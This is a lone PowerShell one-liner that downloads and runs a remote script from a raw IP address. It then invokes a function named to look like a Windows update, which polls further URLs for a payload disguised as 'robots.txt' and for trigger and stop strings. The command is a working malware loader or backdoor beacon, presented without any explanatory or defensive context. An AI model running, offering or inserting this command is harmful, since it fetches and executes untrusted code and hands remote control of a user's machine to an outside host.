
IEX ((new-object net.webclient).downloadstring('http://212.163.35.67/upload/Kernel32.ps1')); Kernel32-Update -CheckURL http://212.163.35.67/upload/st.txt -PayloadURL http://212.163.35.67/upload/robots.txt -MagicString run -StopString stopthis

